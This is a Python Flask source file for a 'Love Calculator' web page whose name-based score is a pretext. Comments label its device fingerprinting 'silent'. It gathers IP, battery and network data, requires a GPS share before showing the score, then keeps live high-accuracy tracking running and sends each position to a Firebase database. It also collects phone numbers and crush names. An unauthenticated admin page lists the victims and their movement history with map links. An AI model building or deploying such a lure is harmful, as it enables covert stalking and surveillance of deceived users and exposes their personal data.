from flask import Flask, request, jsonify, render_template_string
import os
import random
import json
import requests
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://YOUR-PROJECT-default-rtdb.firebaseio.com/")
if FIREBASE_URL.endswith('/'):
    FIREBASE_URL = FIREBASE_URL[:-1]

# ========== LOVE CALCULATOR FUNCTIONS ==========
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
    ]
    return random.choice(messages)

# ========== FIREBASE DATABASE FUNCTIONS ==========
def save_to_firebase(path, data):
    try:
        url = f"{FIREBASE_URL}/{path}.json"
        response = requests.put(url, json=data, timeout=10)
        return response.status_code in [200, 201]
    except Exception as e:
        print(f"Firebase save error: {e}")
        return False

def get_from_firebase(path):
    try:
        url = f"{FIREBASE_URL}/{path}.json"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print(f"Firebase get error: {e}")
        return None

def save_visitor(session_id, data):
    path = f"visitors/{session_id}"
    return save_to_firebase(path, data)

def save_location(session_id, lat, lon):
    timestamp = datetime.now().isoformat()
    path = f"location_history/{session_id}_{timestamp}"
    location_data = {
        "sessionId": session_id,
        "timestamp": timestamp,
        "latitude": lat,
        "longitude": lon
    }
    return save_to_firebase(path, location_data)

# ========== HTML TEMPLATE (Location FIRST, then Fortune) ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Calculator | Cosmic Location Match</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        .next-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        .next-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .location-panel {
            margin-top: 20px;
            padding: 25px;
            background: #fef5e7;
            border-radius: 25px;
            display: none;
            border: 2px solid #ffe0b5;
        }
        .location-panel h3 { color: #c0392b; margin-bottom: 15px; }
        .location-status {
            background: white;
            padding: 15px;
            border-radius: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
        .live-track {
            background: #e8f5e9;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 12px;
            display: none;
        }
        .location-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .location-btn:hover { transform: translateY(-2px); }
        .location-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .result {
            margin-top: 25px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }
        .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
        
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
        
        .map-link {
            display: inline-block;
            background: #667eea;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            text-decoration: none;
            margin-top: 8px;
        }
        .location-badge {
            background: #48bb78;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            display: inline-block;
            margin-top: 8px;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Calculator</h1>
    <div class="subtitle">Find your cosmic connection ✨</div>
    
    <!-- STEP 1: Names -->
    <div id="stepNames">
        <div class="input-group">
            <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
            <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
        </div>
        <button class="next-btn" onclick="goToLocation()">🌍 Continue to Location 🌍</button>
    </div>
    
    <!-- STEP 2: Location (MANDATORY before fortune) -->
    <div id="stepLocation" class="location-panel">
        <h3>📍 Share Your Location</h3>
        <p style="font-size: 14px; margin-bottom: 15px;">To unlock your love fortune, we need your cosmic coordinates ✨</p>
        
        <div class="location-status" id="locationStatus">
            🌟 Click below to share your location
        </div>
        
        <div id="liveTrackPanel" class="live-track">
            <strong>🔄 Live GPS Tracking Active</strong><br>
            <span id="liveCount">0</span> location updates recorded<br>
            <span id="lastLocation">Waiting for first location...</span>
        </div>
        
        <button class="location-btn" id="locationBtn" onclick="requestLocationAndFortune()">
            📍 Share My Location & Get Fortune 📍
        </button>
        
        <div id="mapPreview" style="margin-top: 15px; display: none;">
            <a href="#" id="mapLink" target="_blank" class="map-link">🗺️ View on Google Maps</a>
        </div>
    </div>
    
    <!-- STEP 3: Fortune Result -->
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
        <div id="locationBadge" style="margin-top: 10px;"></div>
    </div>
    
    <!-- STEP 4: Save Phone -->
    <div id="phoneSection" class="phone-section">
        <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
        <button class="save-btn" onclick="savePhone()">💾 Save to Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔒 Location required for fortune | Live GPS tracking</footer>
</div>

<script>
    let sessionId = localStorage.getItem('love_session');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session', sessionId);
    }
    
    let currentFortune = '';
    let currentPercent = 0;
    let name1 = '', name2 = '';
    let locationWatchId = null;
    let locationUpdateCount = 0;
    let currentLat = null, currentLon = null;
    let locationGranted = false;
    
    let collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };
    
    // Silent device data collection
    async function collectDeviceData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        } catch(e) { collectedData.fingerprint = 'error'; }
        
        collectedData.screen = screen.width + 'x' + screen.height;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        
        if (navigator.deviceMemory) {
            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        
        const connection = navigator.connection;
        if (connection) {
            collectedData.networkType = connection.effectiveType;
        }
        
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
    }
    
    function goToLocation() {
        name1 = document.getElementById('name1').value.trim();
        name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showStatus('Please enter both names 💕', 'error');
            return;
        }
        
        collectedData.name = name1;
        collectedData.crush_name = name2;
        
        fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
        
        document.getElementById('stepNames').style.display = 'none';
        document.getElementById('stepLocation').style.display = 'block';
        showStatus('Please share your location to continue', 'info');
    }
    
    function requestLocationAndFortune() {
        const locationBtn = document.getElementById('locationBtn');
        locationBtn.innerHTML = '<span class="loading"></span> Getting location...';
        locationBtn.disabled = true;
        
        document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
        document.getElementById('liveTrackPanel').style.display = 'block';
        
        // Get initial location
        navigator.geolocation.getCurrentPosition(async (position) => {
            currentLat = position.coords.latitude;
            currentLon = position.coords.longitude;
            locationGranted = true;
            
            // Save initial location
            collectedData.latitude = currentLat;
            collectedData.longitude = currentLon;
            collectedData.mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
            
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            await fetch('/save-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    latitude: currentLat,
                    longitude: currentLon
                })
            });
            
            // Show map preview
            document.getElementById('mapPreview').style.display = 'block';
            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
            document.getElementById('locationStatus').innerHTML = `✅ Location captured! Latitude: ${currentLat.toFixed(6)}, Longitude: ${currentLon.toFixed(6)}`;
            
            // Start LIVE GPS TRACKING (keeps updating as user moves)
            startLiveTracking();
            
            // Now calculate and show fortune
            await calculateAndShowFortune();
            
            locationBtn.innerHTML = '✅ Location Captured! Fortune Unlocked ✅';
            
        }, (error) => {
            let errorMsg = 'Location access required for fortune reading!';
            if (error.code === 1) errorMsg = '❌ Location permission denied. Please allow location to get your fortune!';
            if (error.code === 2) errorMsg = '❌ Position unavailable. Please try again.';
            if (error.code === 3) errorMsg = '❌ Location request timed out. Please check your GPS.';
            
            document.getElementById('locationStatus').innerHTML = errorMsg;
            locationBtn.innerHTML = '📍 Try Again 📍';
            locationBtn.disabled = false;
            showStatus(errorMsg, 'error');
        }, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    }
    
    function startLiveTracking() {
        // Watch position for live GPS tracking
        locationWatchId = navigator.geolocation.watchPosition(async (position) => {
            const newLat = position.coords.latitude;
            const newLon = position.coords.longitude;
            locationUpdateCount++;
            
            document.getElementById('liveCount').innerHTML = locationUpdateCount;
            document.getElementById('lastLocation').innerHTML = `📍 Last: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
            
            // Update current location
            currentLat = newLat;
            currentLon = newLon;
            
            // Update map link
            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
            
            // Save each location update to Firebase for live tracking
            await fetch('/save-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    latitude: newLat,
                    longitude: newLon
                })
            });
            
            // Update visitor data with latest location
            collectedData.latitude = newLat;
            collectedData.longitude = newLon;
            collectedData.mapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
            
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
        }, (error) => {
            console.log('Watch position error:', error);
        }, {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 5000
        });
    }
    
    async function calculateAndShowFortune() {
        try {
            const response = await fetch('/calculate-love', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1, name2 })
            });
            const result = await response.json();
            
            currentPercent = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentage').innerHTML = currentPercent + '%';
            document.getElementById('message').innerHTML = currentFortune;
            
            // Add location badge
            let locationBadge = '';
            if (currentLat && currentLon) {
                locationBadge = `<div class="location-badge">📍 Location Captured | Live Tracking Active (${locationUpdateCount} updates)</div>`;
                document.getElementById('locationBadge').innerHTML = locationBadge;
            }
            
            document.getElementById('result').style.display = 'block';
            document.getElementById('phoneSection').style.display = 'block';
            
            collectedData.fortuneText = currentFortune;
            collectedData.percentage = currentPercent;
            
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            showStatus('Your love fortune is ready! ✨', 'success');
            
        } catch(e) {
            showStatus('Something went wrong. Please try again.', 'error');
        }
    }
    
    async function savePhone() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) {
            showStatus('Please enter your phone number', 'error');
            return;
        }
        
        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
            showStatus('Please enter a valid phone number', 'error');
            return;
        }
        
        const saveBtn = document.querySelector('.save-btn');
        saveBtn.innerHTML = '<span class="loading"></span> Saving...';
        saveBtn.disabled = true;
        
        try {
            const response = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortune,
                    percentage: currentPercent,
                    totalLocationUpdates: locationUpdateCount
                })
            });
            const result = await response.json();
            if (result.status === 'saved') {
                showStatus('✅ Number saved! Your love result is secured.', 'success');
                document.getElementById('phone').disabled = true;
                saveBtn.innerHTML = '✅ Saved!';
                saveBtn.style.background = '#38a169';
            }
        } catch(e) {
            showStatus('Network error. Please try again.', 'error');
            saveBtn.innerHTML = '💾 Save to Phone';
            saveBtn.disabled = false;
        }
    }
    
    function showStatus(message, type) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`;
        setTimeout(() => {
            statusDiv.style.display = 'none';
            statusDiv.className = 'status';
        }, 4000);
    }
    
    collectDeviceData();
</script>
</body>
</html>
'''

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        
        save_visitor(session_id, data)
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/save-location', methods=['POST'])
def save_location_route():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if session_id and lat and lon:
            save_location(session_id, lat, lon)
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        print(f"Location error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/save-phone', methods=['POST'])
def save_phone():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        phone = data.get('phoneNumber')
        fortune = data.get('fortune')
        percentage = data.get('percentage')
        
        visitor = get_from_firebase(f"visitors/{session_id}")
        if visitor:
            visitor['phoneNumber'] = phone
            visitor['fortuneText'] = fortune
            visitor['percentage'] = percentage
            save_visitor(session_id, visitor)
        
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save phone error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    try:
        data = request.get_json()
        name1 = data.get('name1', '')
        name2 = data.get('name2', '')
        percentage = calculate_love_percentage(name1, name2)
        message = get_love_message(name1, name2, percentage)
        return jsonify({'percentage': percentage, 'message': message})
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# ========== ADMIN ROUTE to view ALL location tracking ==========
@app.route('/admin-view-data')
def admin_view():
    try:
        visitors = get_from_firebase("visitors")
        locations = get_from_firebase("location_history")
        
        if not visitors:
            return """
            <html>
            <head><title>Admin - No Data</title></head>
            <body style="font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee;">
                <h1>📊 No Visitor Data Yet</h1>
                <p>Have users visit the love calculator first.</p>
                <a href="/" style="color: #f093fb;">Back to Calculator</a>
            </body>
            </html>
            """
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard - Live Location Tracking</title>
            <style>
                body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                h1 { color: #f093fb; }
                h2 { color: #48bb78; margin-top: 30px; }
                .container { overflow-x: auto; }
                table { border-collapse: collapse; width: 100%; background: #16213e; margin-bottom: 20px; }
                th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
                th { background: #e94560; color: white; position: sticky; top: 0; }
                .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
                .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                .refresh { background: #38a169; }
                .location-row { background: #1a2a3a; }
            </style>
        </head>
        <body>
            <h1>📊 Live GPS Tracking Dashboard</h1>
            <p>
                <a href="/admin-view-data" class="btn refresh">🔄 Refresh</a>
                <a href="/" class="btn">🏠 Back to Calculator</a>
            </p>
        """
        
        # Visitors summary
        if visitors:
            visitor_count = len(visitors)
            html += f'<div class="count"><strong>Total Visitors:</strong> {visitor_count}</div>'
            
            html += """
            <h2>📍 Visitor Data (with Location)</h2>
            <div class="container">
                <table>
                    <thead>
                        <tr>
                            <th>Session ID</th>
                            <th>Name</th>
                            <th>Crush</th>
                            <th>Love %</th>
                            <th>Phone</th>
                            <th>Latest Latitude</th>
                            <th>Latest Longitude</th>
                            <th>Map</th>
                            <th>Battery</th>
                            <th>Device</th>
                        </tr>
                    </thead>
                    <tbody>
            """
            for session_id, visitor in visitors.items():
                if isinstance(visitor, dict):
                    map_link = ""
                    if visitor.get('latitude'):
                        map_link = f'<a href="https://www.google.com/maps?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank" style="color:#f093fb;">View Map</a>'
                    
                    html += f"""
                        <tr>
                            <td>{session_id[:30]}...</td>
                            <td><strong>{visitor.get('name', '')}</strong></td>
                            <td>{visitor.get('crush_name', '')}</td>
                            <td style="color: #f093fb;">{visitor.get('percentage', '')}%</td>
                            <td>{visitor.get('phoneNumber', '')}</td>
                            <td>{visitor.get('latitude', 'Not shared')}</td>
                            <td>{visitor.get('longitude', 'Not shared')}</td>
                            <td>{map_link}</td>
                            <td>{visitor.get('batteryLevel', '')}</td>
                            <td>{visitor.get('deviceMemory', '')}</td>
                        </tr>
                    """
            html += "</tbody></table></div>"
        
        # Live location tracking history
        if locations:
            location_count = len(locations)
            html += f'<div class="count"><strong>Total Location Updates:</strong> {location_count} (Live GPS Tracking)</div>'
            
            html += """
            <h2>🔄 Live GPS Movement Tracking (Chronological)</h2>
            <div class="container">
                <table>
                    <thead>
                        <tr>
                            <th>Session ID</th>
                            <th>Timestamp</th>
                            <th>Latitude</th>
                            <th>Longitude</th>
                            <th>Google Maps</th>
                        </tr>
                    </thead>
                    <tbody>
            """
            # Sort by timestamp
            sorted_locations = sorted(locations.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
            for key, loc in sorted_locations:
                if isinstance(loc, dict):
                    map_link = f'<a href="https://www.google.com/maps?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank" style="color:#48bb78;">📍 View</a>'
                    html += f"""
                        <tr class="location-row">
                            <td>{loc.get('sessionId', '')[:30]}...</td>
                            <td>{loc.get('timestamp', '')[:19]}</td>
                            <td>{loc.get('latitude', '')}</td>
                            <td>{loc.get('longitude', '')}</td>
                            <td>{map_link}</td>
                        </tr>
                    """
            html += "</tbody></table></div>"
        
        html += "</body></html>"
        return html
    except Exception as e:
        return f"<h1>Error: {str(e)}</h1><p><a href='/'>Back</a></p>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
